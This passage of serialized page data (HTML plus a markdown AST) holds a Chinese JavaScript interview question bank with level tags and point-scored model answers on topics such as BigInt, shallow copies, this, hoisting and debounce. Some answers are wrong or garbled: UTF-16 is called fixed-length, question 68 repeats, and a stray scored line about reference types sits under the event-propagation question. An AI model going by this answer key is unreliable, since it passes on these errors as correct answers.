分）</h4>\\n<ul>\\n<li>JavaScript中Number.MAX_SAFE_INTEGER表示最⼤安全数字，计算结果是9007199254740991，即在这个数范围内不会出现精度丢失（⼩数除外）。但是⼀旦超过这个范围，js就会出现计算不准确的情况，这在⼤数计算的时候不得不依靠⼀些第三⽅库进⾏解决，因此官⽅提出了BigInt来解决此问题。</li>\\n</ul>\\n<h2>65. object.assign和扩展运算法是深拷贝还是浅拷贝，两者区别？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><p>两者都是浅拷贝。</p>\\n</li>\\n<li><p>Object.assign()方法接收的第一个参数作为目标对象，后面的所有参数作为源对象。然后把所有的源对象合并到目标对象中。它会修改了一个对象，因此会触发 ES6 setter。</p>\\n</li>\\n<li><p>扩展操作符（…）使用它时，数组或对象中的每一个值都会被拷贝到一个新的数组或对象中。它不复制继承的属性或类的属性，但是它会复制ES6的 symbols 属性。</p>\\n</li>\\n</ul>\\n<h2>66. 如果new一个箭头函数的会怎么样?</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><p>箭头函数是ES6中的提出来的，它没有prototype，也没有自己的this指向，更不可以使用arguments参数，所以不能New一个箭头函数。</p>\\n</li>\\n<li><p>new操作符的实现步骤如下：</p>\\n</li>\\n<li><p>1.创建一个对象</p>\\n</li>\\n<li><p>2.将构造函数的作用域赋给新对象（也就是将对象的__proto__属性指向构造函数的prototype属性）</p>\\n</li>\\n<li><p>3.指向构造函数中的代码，构造函数中的this指向该对象（也就是为这个对象添加属性和方法）</p>\\n</li>\\n<li><p>4.返回新的对象</p>\\n</li>\\n<li><p>由于箭头函数没有自己的this，用new调用会报错！所以，上面的第二、三步，箭头函数都是没有办法执行的。</p>\\n</li>\\n</ul>\\n<h2>67. 对对象与数组的解构的理解</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><p>解构是 ES6 提供的一种新的提取数据的模式，这种模式能够从对象或数组里有针对性地拿到想要的数值。</p>\\n</li>\\n<li><p>数组的解构 在解构数组时，以元素的位置为匹配条件来提取想要的数据的</p>\\n</li>\\n<li><p>对象的解构 对象解构比数组结构稍微复杂一些，也更显强大。在解构对象时，是以属性的名称为匹配条件，来提取想要的数据的</p>\\n</li>\\n</ul>\\n<h2>68. 对 rest 参数的理解</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li>扩展运算符被用在函数形参上时，它还可以把一个分离的参数序列整合成一个数组：</li>\\n</ul>\\n<pre><code class=\\"language-js\\">function mutiple(...args) {\\n  let result = 1;\\n  for (var val of args) {\\n    result *= val;\\n  }\\n  return result;\\n}\\nmutiple(1, 2, 3, 4) // 24\\n</code></pre>\\n<ul>\\n<li>这里，传入 mutiple 的是四个分离的参数，但是如果在 mutiple 函数里尝试输出 args 的值，会发现它是一个数组：</li>\\n</ul>\\n<pre><code class=\\"language-js\\">function mutiple(...args) {\\n  console.log(args)\\n}\\nmutiple(1, 2, 3, 4) // [1, 2, 3, 4]\\n</code></pre>\\n<ul>\\n<li>这就是 … rest运算符的又一层威力了，它可以把函数的多个入参收敛进一个数组里。这一点经常用于获取函数的多余参数，或者像上面这样处理函数参数个数不确定的情况。</li>\\n</ul>\\n<h2>68. Map数据结构有哪些操作方法？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><p>size： map.size 返回Map结构的成员总数。</p>\\n</li>\\n<li><p>set(key,value)：设置键名key对应的键值value，然后返回整个Map结构，如果key已经有值，则键值会被更新，否则就新生成该键。（因为返回的是当前Map对象，所以可以链式调用）</p>\\n</li>\\n<li><p>get(key)：读取key对应的键值，如果找不到key，返回undefined。</p>\\n</li>\\n<li><p>has(key)：返回一个布尔值，表示某个键是否在当前Map对象中。</p>\\n</li>\\n<li><p>delete(key)：删除某个键，返回true。如果删除失败，返回false。</p>\\n</li>\\n<li><p>clear()：清除所有成员，没有返回值。</p>\\n</li>\\n</ul>\\n<h2>69. 数组有哪些原生方法？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><p>数组和字符串的转换方法：toString()、toLocalString()、join() 其中 join() 方法可以指定转换为字符串时的分隔符。</p>\\n</li>\\n<li><p>数组尾部操作的方法 pop() 和 push()，push 方法可以传入多个参数。</p>\\n</li>\\n<li><p>数组首部操作的方法 shift() 和 unshift() 重排序的方法 reverse() 和 sort()，sort() 方法可以传入一个函数来进行比较，传入前后两个值，如果返回值为正数，则交换两个参数的位置。</p>\\n</li>\\n<li><p>数组连接的方法 concat() ，返回的是拼接好的数组，不影响原数组。</p>\\n</li>\\n<li><p>数组截取办法 slice()，用于截取数组中的一部分返回，不影响原数组。</p>\\n</li>\\n<li><p>数组插入方法 splice()，影响原数组查找特定项的索引的方法，indexOf() 和 lastIndexOf() 迭代方法 every()、some()、filter()、map() 和 forEach() 方法</p>\\n</li>\\n<li><p>reduce() 和 reduceRight() 方法将数组元素计算为一个值，这对求和非常有用</p>\\n</li>\\n</ul>\\n<h2>70. Unicode、UTF-8、UTF-16、UTF-32的区别？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><p>Unicode 是一种字符集，包含了世界上所有的符号，每个符号对应一个唯一的编码，Unicode 的编码范围是 0x0000 至 0x10FFFF。</p>\\n</li>\\n<li><p>UTF-8、UTF-16、UTF-32 是三种不同的 Unicode 的编码方式，用于将 Unicode 的编码转换为字节序列，以便在计算机中存储和传输。</p>\\n</li>\\n<li><p>UTF-8 是一种变长的编码方式，使用 1 到 4 个字节来表示一个符号，根据不同的符号而变化字节长度。</p>\\n</li>\\n<li><p>UTF-16 是一种定长的编码方式，使用 2 个或 4 个字节来表示一个符号，根据不同的符号而变化字节长度。</p>\\n</li>\\n<li><p>UTF-32 是一种定长的编码方式，使用 4 个字节来表示一个符号，每个符号都使用 4 个字节来表示。</p>\\n</li>\\n</ul>\\n","ast":[{"type":"heading","raw":"# JavaScript\\n\\n","depth":1,"text":"JavaScript","tokens":[{"type":"text","raw":"JavaScript","text":"JavaScript","escaped":false}]},{"type":"heading","raw":"## 1. JS 数据类型有哪些？\\n\\n","depth":2,"text":"1. JS 数据类型有哪些？","tokens":[{"type":"text","raw":"1. JS 数据类型有哪些？","text":"1. JS 数据类型有哪些？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`\\n\\n","depth":4,"text":"级别：`W1`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- **1：** 基本类型：字符串（String）、数字(Number)、布尔(Boolean)、空（Null）、未定义（Undefined）、Symbol（ES6特性）、BigInt（ES11特性）；\\n- **1：** 引用类型：对象（Object）、函数（Function）、数组（Array）等；","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 基本类型：字符串（String）、数字(Number)、布尔(Boolean)、空（Null）、未定义（Undefined）、Symbol（ES6特性）、BigInt（ES11特性）；\\n","task":false,"loose":false,"text":"**1：** 基本类型：字符串（String）、数字(Number)、布尔(Boolean)、空（Null）、未定义（Undefined）、Symbol（ES6特性）、BigInt（ES11特性）；","tokens":[{"type":"text","raw":"**1：** 基本类型：字符串（String）、数字(Number)、布尔(Boolean)、空（Null）、未定义（Undefined）、Symbol（ES6特性）、BigInt（ES11特性）；","text":"**1：** 基本类型：字符串（String）、数字(Number)、布尔(Boolean)、空（Null）、未定义（Undefined）、Symbol（ES6特性）、BigInt（ES11特性）；","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 基本类型：字符串（String）、数字(Number)、布尔(Boolean)、空（Null）、未定义（Undefined）、Symbol（ES6特性）、BigInt（ES11特性）；","text":" 基本类型：字符串（String）、数字(Number)、布尔(Boolean)、空（Null）、未定义（Undefined）、Symbol（ES6特性）、BigInt（ES11特性）；","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 引用类型：对象（Object）、函数（Function）、数组（Array）等；","task":false,"loose":false,"text":"**1：** 引用类型：对象（Object）、函数（Function）、数组（Array）等；","tokens":[{"type":"text","raw":"**1：** 引用类型：对象（Object）、函数（Function）、数组（Array）等；","text":"**1：** 引用类型：对象（Object）、函数（Function）、数组（Array）等；","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 引用类型：对象（Object）、函数（Function）、数组（Array）等；","text":" 引用类型：对象（Object）、函数（Function）、数组（Array）等；","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 2. == 和 === 的区别是什么？\\n\\n","depth":2,"text":"2. == 和 === 的区别是什么？","tokens":[{"type":"text","raw":"2. == 和 === 的区别是什么？","text":"2. == 和 === 的区别是什么？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`\\n\\n","depth":4,"text":"级别：`W1`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- **1：** == 是 宽松相等，会进行类型转换，比较前会先转换两边的操作数类型（例如，\'5\' == 5 为 true;\\n- **1：** === 是 严格相等，不会进行类型转换，只有两边的值和类型都相同才会返回 true（例如，\'5\' === 5 为 false;","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** == 是 宽松相等，会进行类型转换，比较前会先转换两边的操作数类型（例如，\'5\' == 5 为 true;\\n","task":false,"loose":false,"text":"**1：** == 是 宽松相等，会进行类型转换，比较前会先转换两边的操作数类型（例如，\'5\' == 5 为 true;","tokens":[{"type":"text","raw":"**1：** == 是 宽松相等，会进行类型转换，比较前会先转换两边的操作数类型（例如，\'5\' == 5 为 true;","text":"**1：** == 是 宽松相等，会进行类型转换，比较前会先转换两边的操作数类型（例如，\'5\' == 5 为 true;","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" == 是 宽松相等，会进行类型转换，比较前会先转换两边的操作数类型（例如，\'5\' == 5 为 true;","text":" == 是 宽松相等，会进行类型转换，比较前会先转换两边的操作数类型（例如，\'5\' == 5 为 true;","escaped":false}]}]},{"type":"list_item","raw":"- **1：** === 是 严格相等，不会进行类型转换，只有两边的值和类型都相同才会返回 true（例如，\'5\' === 5 为 false;","task":false,"loose":false,"text":"**1：** === 是 严格相等，不会进行类型转换，只有两边的值和类型都相同才会返回 true（例如，\'5\' === 5 为 false;","tokens":[{"type":"text","raw":"**1：** === 是 严格相等，不会进行类型转换，只有两边的值和类型都相同才会返回 true（例如，\'5\' === 5 为 false;","text":"**1：** === 是 严格相等，不会进行类型转换，只有两边的值和类型都相同才会返回 true（例如，\'5\' === 5 为 false;","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" === 是 严格相等，不会进行类型转换，只有两边的值和类型都相同才会返回 true（例如，\'5\' === 5 为 false;","text":" === 是 严格相等，不会进行类型转换，只有两边的值和类型都相同才会返回 true（例如，\'5\' === 5 为 false;","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 3. var 、let 、 const 的区别是什么？\\n\\n","depth":2,"text":"3. var 、let 、 const 的区别是什么？","tokens":[{"type":"text","raw":"3. var 、let 、 const 的区别是什么？","text":"3. var 、let 、 const 的区别是什么？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`\\n\\n","depth":4,"text":"级别：`W1`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- **1：** var 作用域: 函数作用域（如果在函数内部声明），全局作用域（如果在函数外部声明）;\\n              提升: 声明和初始化都会被提升（变量提升，但未初始化时是 undefined）;\\n- **1：** let、 const 作用域: 级作用域（只在其所在的代码块内有效）;\\n          提升: 变量提升但不会初始化，存在“暂时性死区”，即在声明之前不能访问;\\n- **1：** 区别:\\n            const： 需要在声明时初始化，且之后不能被修改;\\n            let：可以修改其值;\\n            var： 是函数作用域或全局作用域，let 和 const 是块级作用域;","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** var 作用域: 函数作用域（如果在函数内部声明），全局作用域（如果在函数外部声明）;\\n              提升: 声明和初始化都会被提升（变量提升，但未初始化时是 undefined）;\\n","task":false,"loose":false,"text":"**1：** var 作用域: 函数作用域（如果在函数内部声明），全局作用域（如果在函数外部声明）;\\n            提升: 声明和初始化都会被提升（变量提升，但未初始化时是 undefined）;","tokens":[{"type":"text","raw":"**1：** var 作用域: 函数作用域（如果在函数内部声明），全局作用域（如果在函数外部声明）;\\n\\n            提升: 声明和初始化都会被提升（变量提升，但未初始化时是 undefined）;","text":"**1：** var 作用域: 函数作用域（如果在函数内部声明），全局作用域（如果在函数外部声明）;\\n        提升: 声明和初始化都会被提升（变量提升，但未初始化时是 undefined）;","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" var 作用域: 函数作用域（如果在函数内部声明），全局作用域（如果在函数外部声明）;\\n        提升: 声明和初始化都会被提升（变量提升，但未初始化时是 undefined）;","text":" var 作用域: 函数作用域（如果在函数内部声明），全局作用域（如果在函数外部声明）;\\n        提升: 声明和初始化都会被提升（变量提升，但未初始化时是 undefined）;","escaped":false}]}]},{"type":"list_item","raw":"- **1：** let、 const 作用域: 级作用域（只在其所在的代码块内有效）;\\n          提升: 变量提升但不会初始化，存在“暂时性死区”，即在声明之前不能访问;\\n","task":false,"loose":false,"text":"**1：** let、 const 作用域: 级作用域（只在其所在的代码块内有效）;\\n        提升: 变量提升但不会初始化，存在“暂时性死区”，即在声明之前不能访问;","tokens":[{"type":"text","raw":"**1：** let、 const 作用域: 级作用域（只在其所在的代码块内有效）;\\n\\n        提升: 变量提升但不会初始化，存在“暂时性死区”，即在声明之前不能访问;","text":"**1：** let、 const 作用域: 级作用域（只在其所在的代码块内有效）;\\n    提升: 变量提升但不会初始化，存在“暂时性死区”，即在声明之前不能访问;","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" let、 const 作用域: 级作用域（只在其所在的代码块内有效）;\\n    提升: 变量提升但不会初始化，存在“暂时性死区”，即在声明之前不能访问;","text":" let、 const 作用域: 级作用域（只在其所在的代码块内有效）;\\n    提升: 变量提升但不会初始化，存在“暂时性死区”，即在声明之前不能访问;","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 区别:\\n            const： 需要在声明时初始化，且之后不能被修改;\\n            let：可以修改其值;\\n            var： 是函数作用域或全局作用域，let 和 const 是块级作用域;","task":false,"loose":false,"text":"**1：** 区别:\\n          const： 需要在声明时初始化，且之后不能被修改;\\n          let：可以修改其值;\\n          var： 是函数作用域或全局作用域，let 和 const 是块级作用域;","tokens":[{"type":"text","raw":"**1：** 区别:\\n\\n          const： 需要在声明时初始化，且之后不能被修改;\\n          let：可以修改其值;\\n          var： 是函数作用域或全局作用域，let 和 const 是块级作用域;","text":"**1：** 区别:\\n      const： 需要在声明时初始化，且之后不能被修改;\\n      let：可以修改其值;\\n      var： 是函数作用域或全局作用域，let 和 const 是块级作用域;","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 区别:\\n      const： 需要在声明时初始化，且之后不能被修改;\\n      let：可以修改其值;\\n      var： 是函数作用域或全局作用域，let 和 const 是块级作用域;","text":" 区别:\\n      const： 需要在声明时初始化，且之后不能被修改;\\n      let：可以修改其值;\\n      var： 是函数作用域或全局作用域，let 和 const 是块级作用域;","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 4. 什么是事件冒泡和事件捕获？\\n\\n","depth":2,"text":"4. 什么是事件冒泡和事件捕获？","tokens":[{"type":"text","raw":"4. 什么是事件冒泡和事件捕获？","text":"4. 什么是事件冒泡和事件捕获？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`\\n\\n","depth":4,"text":"级别：`W1`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- **1：** 事件冒泡：事件从目标元素开始，向上冒泡到 document;\\n- **1：** 事件捕获：事件从 document 开始，向下捕获到目标元素;\\n- **1：** 事件流顺序: 1.捕获 -> 2.目标 -> 3.冒泡;\\n- **2：** 引用类型：对象（Object）、函数（Function）、数组（Array）等；","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 事件冒泡：事件从目标元素开始，向上冒泡到 document;\\n","task":false,"loose":false,"text":"**1：** 事件冒泡：事件从目标元素开始，向上冒泡到 document;","tokens":[{"type":"text","raw":"**1：** 事件冒泡：事件从目标元素开始，向上冒泡到 document;","text":"**1：** 事件冒泡：事件从目标元素开始，向上冒泡到 document;","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 事件冒泡：事件从目标元素开始，向上冒泡到 document;","text":" 事件冒泡：事件从目标元素开始，向上冒泡到 document;","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 事件捕获：事件从 document 开始，向下捕获到目标元素;\\n","task":false,"loose":false,"text":"**1：** 事件捕获：事件从 document 开始，向下捕获到目标元素;","tokens":[{"type":"text","raw":"**1：** 事件捕获：事件从 document 开始，向下捕获到目标元素;","text":"**1：** 事件捕获：事件从 document 开始，向下捕获到目标元素;","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 事件捕获：事件从 document 开始，向下捕获到目标元素;","text":" 事件捕获：事件从 document 开始，向下捕获到目标元素;","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 事件流顺序: 1.捕获 -> 2.目标 -> 3.冒泡;\\n","task":false,"loose":false,"text":"**1：** 事件流顺序: 1.捕获 -> 2.目标 -> 3.冒泡;","tokens":[{"type":"text","raw":"**1：** 事件流顺序: 1.捕获 -> 2.目标 -> 3.冒泡;","text":"**1：** 事件流顺序: 1.捕获 -> 2.目标 -> 3.冒泡;","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 事件流顺序: 1.捕获 -> 2.目标 -> 3.冒泡;","text":" 事件流顺序: 1.捕获 -> 2.目标 -> 3.冒泡;","escaped":false}]}]},{"type":"list_item","raw":"- **2：** 引用类型：对象（Object）、函数（Function）、数组（Array）等；","task":false,"loose":false,"text":"**2：** 引用类型：对象（Object）、函数（Function）、数组（Array）等；","tokens":[{"type":"text","raw":"**2：** 引用类型：对象（Object）、函数（Function）、数组（Array）等；","text":"**2：** 引用类型：对象（Object）、函数（Function）、数组（Array）等；","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]},{"type":"text","raw":" 引用类型：对象（Object）、函数（Function）、数组（Array）等；","text":" 引用类型：对象（Object）、函数（Function）、数组（Array）等；","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 5. JS 什么是防抖和节流？它们的应用场景有哪些？\\n\\n","depth":2,"text":"5. JS 什么是防抖和节流？它们的应用场景有哪些？","tokens":[{"type":"text","raw":"5. JS 什么是防抖和节流？它们的应用场景有哪些？","text":"5. JS 什么是防抖和节流？它们的应用场景有哪些？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`\\n\\n","depth":4,"text":"级别：`W1`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"}]},{"type":"heading","raw":"#### 解答（3 分）\\n\\n","depth":4,"text":"解答（3 分）","tokens":[{"type":"text","raw":"解答（3 分）","text":"解答（3 分）","escaped":false}]},{"type":"list","raw":"- **1：** 防抖：在事件被触发后，延迟一定时间后再执行回调函数，如果在延迟时间内再次触发事件，则重新计算延迟时间，直到延迟时间结束后才执行回调函数。例如，在用户输入搜索框时，防止频繁发送请求，可以使用防抖函数，只有在用户停止输入一段时间后才发送搜索请求。\\n- **2：** 节流：在一定时间内，只允许函数执行一次。例如，在页面滚动时，需要频繁执行某个函数来处理滚动事件，但为了避免函数执行过于频繁影响性能，可以使用节流函数，限制函数在一定时间内只执行一次。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 防抖：在事件被触发后，延迟一定时间后再执行回调函数，如果在延迟时间内再次触发事件，则重新计算延迟时间，直到延迟时间结束后才执行回调函数。例如，在用户输入搜索框时，防止频繁发送请求，可以使用防抖函数，只有在用户停止输入一段时间后才发送搜索请求。\\n","task":false,"loose":false,"text":"**1：** 防抖：在事件被触发后，延迟一定时间后再执行回调函数，如果在延迟时间内再次触发事件，则重新计算延迟时间，直到延迟时间结束后才执行回调函数。例如，在用户输入搜索框时，防止频繁发送请求，可以使用防抖函数，只有在用户停止输入一段时间后才发送搜索请求。","tokens":[{"type":"text","raw":"**1：** 防抖：在事件被触发后，延迟一定时间后再执行回调函数，如果在延迟时间内再次触发事件，则重新计算延迟时间，直到延迟时间结束后才执行回调函数。例如，在用户输入搜索框时，防止频繁发送请求，可以使用防抖函数，只有在用户停止输入一段时间后才发送搜索请求。","text":"**1：** 防抖：在事件被触发后，延迟一定时间后再执行回调函数，如果在延迟时间内再次触发事件，则重新计算延迟时间，直到延迟时间结束后才执行回调函数。例如，在用户输入搜索框时，防止频繁发送请求，可以使用防抖函数，只有在用户停止输入一段时间后才发送搜索请求。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 防抖：在事件被触发后，延迟一定时间后再执行回调函数，如果在延迟时间内再次触发事件，则重新计算延迟时间，直到延迟时间结束后才执行回调函数。例如，在用户输入搜索框时，防止频繁发送请求，可以使用防抖函数，只有在用户停止输入一段时间后才发送搜索请求。","text":" 防抖：在事件被触发后，延迟一定时间后再执行回调函数，如果在延迟时间内再次触发事件，则重新计算延迟时间，直到延迟时间结束后才执行回调函数。例如，在用户输入搜索框时，防止频繁发送请求，可以使用防抖函数，只有在用户停止输入一段时间后才发送搜索请求。","escaped":false}]}]},{"type":"list_item","raw":"- **2：** 节流：在一定时间内，只允许函数执行一次。例如，在页面滚动时，需要频繁执行某个函数来处理滚动事件，但为了避免函数执行过于频繁影响性能，可以使用节流函数，限制函数在一定时间内只执行一次。","task":false,"loose":false,"text":"**2：** 节流：在一定时间内，只允许函数执行一次。例如，在页面滚动时，需要频繁执行某个函数来处理滚动事件，但为了避免函数执行过于频繁影响性能，可以使用节流函数，限制函数在一定时间内只执行一次。","tokens":[{"type":"text","raw":"**2：** 节流：在一定时间内，只允许函数执行一次。例如，在页面滚动时，需要频繁执行某个函数来处理滚动事件，但为了避免函数执行过于频繁影响性能，可以使用节流函数，限制函数在一定时间内只执行一次。","text":"**2：** 节流：在一定时间内，只允许函数执行一次。例如，在页面滚动时，需要频繁执行某个函数来处理滚动事件，但为了避免函数执行过于频繁影响性能，可以使用节流函数，限制函数在一定时间内只执行一次。","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]},{"type":"text","raw":" 节流：在一定时间内，只允许函数执行一次。例如，在页面滚动时，需要频繁执行某个函数来处理滚动事件，但为了避免函数执行过于频繁影响性能，可以使用节流函数，限制函数在一定时间内只执行一次。","text":" 节流：在一定时间内，只允许函数执行一次。例如，在页面滚动时，需要频繁执行某个函数来处理滚动事件，但为了避免函数执行过于频繁影响性能，可以使用节流函数，限制函数在一定时间内只执行一次。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 6. JS 请解释在 JavaScript 中this指针的工作原理，在以下函数调用场景中this指向什么？\\n\\n","depth":2,"text":"6. JS 请解释在 JavaScript 中this指针的工作原理，在以下函数调用场景中this指向什么？","tokens":[{"type":"text","raw":"6. JS 请解释在 JavaScript 中this指针的工作原理，在以下函数调用场景中this指向什么？","text":"6. JS 请解释在 JavaScript 中this指针的工作原理，在以下函数调用场景中this指向什么？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`\\n\\n","depth":4,"text":"级别：`W1`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"}]},{"type":"code","raw":"```js\\nconst person = {\\n    name: \\"张三\\",\\n    sayHello: function() {\\n        console.log(`你好，我的名字叫 ${this.name}`);\\n    }\\n};\\nperson.sayHello();\\n```","lang":"js","text":"const person = {\\n    name: \\"张三\\",\\n    sayHello: function() {\\n        console.log(`你好，我的名字叫 ${this.name}`);\\n    }\\n};\\nperson.sayHello();"},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- **1：** 在person.sayHello()调用中，this指向person对象。\\n- **1：** 当一个函数作为对象的方法被调用时，this指向调用该方法的对象。在这里，sayHello是person对象的方法，所以this指代person，因此可以正确访问person.name","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 在person.sayHello()调用中，this指向person对象。\\n","task":false,"loose":false,"text":"**1：** 在person.sayHello()调用中，this指向person对象。","tokens":[{"type":"text","raw":"**1：** 在person.sayHello()调用中，this指向person对象。","text":"**1：** 在person.sayHello()调用中，this指向person对象。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 在person.sayHello()调用中，this指向person对象。","text":" 在person.sayHello()调用中，this指向person对象。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 当一个函数作为对象的方法被调用时，this指向调用该方法的对象。在这里，sayHello是person对象的方法，所以this指代person，因此可以正确访问person.name","task":false,"loose":false,"text":"**1：** 当一个函数作为对象的方法被调用时，this指向调用该方法的对象。在这里，sayHello是person对象的方法，所以this指代person，因此可以正确访问person.name","tokens":[{"type":"text","raw":"**1：** 当一个函数作为对象的方法被调用时，this指向调用该方法的对象。在这里，sayHello是person对象的方法，所以this指代person，因此可以正确访问person.name","text":"**1：** 